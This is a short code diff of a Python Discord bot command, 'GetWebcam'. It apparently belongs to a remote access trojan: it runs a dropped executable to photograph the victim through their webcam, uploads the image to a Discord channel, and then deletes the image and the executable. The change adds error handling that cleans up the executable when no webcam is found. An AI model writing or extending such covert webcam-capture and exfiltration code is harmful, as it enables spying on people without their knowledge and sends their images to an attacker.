@@ -39,15 +39,20 @@ class GetWebcam(commands.Cog):
                 stdin=subprocess.PIPE
             )
             
-            await ctx.followup.send(
-                embed=self.bot.genEmbed( 
-                    "Image taken from webcam:", 
-                    datetime.now() 
-                ),
-                file=discord.File( 
-                    nr_working + "\\image.png" 
+            try:
+                await ctx.followup.send(
+                    embed=self.bot.genEmbed( 
+                        "Image taken from webcam:", 
+                        datetime.now() 
+                    ),
+                    file=discord.File( 
+                        nr_working + "\\image.png" 
+                    )
                 )
-            )
+            except FileNotFoundError:
+                os.remove(nr_working + "\\cc.exe")
+                return await ctx.followup.send("No webcam!")
+                
             time.sleep(2)
             os.remove(nr_working + "\\image.png")
             os.remove(nr_working + "\\cc.exe")
